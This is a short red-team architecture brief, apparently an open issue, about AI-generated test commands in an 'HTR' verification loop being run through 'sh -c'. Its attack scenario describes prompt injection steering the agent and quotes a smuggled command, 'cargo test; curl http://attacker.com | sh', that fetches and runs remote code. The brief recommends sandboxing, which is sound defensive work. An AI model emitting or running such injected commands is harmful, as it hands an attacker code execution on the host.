---
tags: [architecture-review, adversarial]
status: open
---
# Red Team Architecture Brief: Orchestration Failure via Shell Coupling in HTR

**Finding**: The Arbor HTR Parallel Verification Loop executes candidate changes and code tests using raw POSIX shell invocation (`sh -c`) in git worktrees.

**Current Assumption**: Git worktrees and distinct target directories provide sufficient isolation for evaluating code synthesized by AI agents.

**Attack Scenario**: A synthesized test command, potentially influenced by adversarial input or prompt injection, contains shell metacharacters (e.g., `cargo test; curl http://attacker.com | sh`). The `sh -c` executor blindly processes these metacharacters, escaping the intended "isolated" worktree and executing arbitrary commands on the host machine. The code generation module is dangerously coupled to the host shell.

**Blast Radius**: Critical. Arbitrary code execution on the host machine. No graceful degradation path exists if the shell escapes the worktree directory.

**Recommended Structural Change**: Decouple the evaluation engine from the host shell. Execute all HTR loop tests within a strict sandbox (e.g., Docker containers or Firecracker microVMs). If native execution is required, parse commands strictly and use `Command::new(program).args(args)` without shell interpretation. Do not close this issue without a documented ADR response.
